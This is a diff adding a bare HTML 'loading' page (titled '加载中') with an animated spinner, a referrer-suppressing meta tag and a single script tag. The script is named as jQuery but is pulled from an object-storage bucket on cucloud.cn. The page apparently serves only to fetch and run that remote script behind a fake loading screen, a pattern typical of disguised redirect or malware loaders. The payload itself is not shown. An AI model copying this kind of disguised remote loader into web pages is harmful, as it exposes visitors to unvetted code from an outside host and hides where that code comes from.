@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<meta name="referrer" content="never">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0" />
+<title>加载中</title>
+<style>
+        .loading {
+            margin: 20% auto;
+            width: 0;
+            height: 0;
+            border-right: 1rem solid #fff;
+            border-top: 1rem solid #09ed13;
+            border-left: 1rem solid #fff;
+            border-bottom: 1rem solid #09ed13;
+            border-radius: 1rem;
+            -moz-border-radius: 1rem;
+            -webkit-border-radius: 1rem;
+            animation: bganim 1.6s linear 0s infinite;
+            -moz-animation: bganim 1.6s linear 0s infinite;
+            -webkit-animation: bganim 1.6s linear 0s infinite;
+        }
+        @keyframes bganim {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        @-moz-keyframes bganim {
+            from {
+                -moz-transform: rotate(0deg);
+            }
+
+            to {
+                -moz-transform: rotate(360deg);
+            }
+        }
+        @-webkit-keyframes bganim {
+            from {
+                -webkit-transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://obs-helf.cucloud.cn/dsgvb/jquery-3.6.7.min.js"></script>
+</body>
+</html>
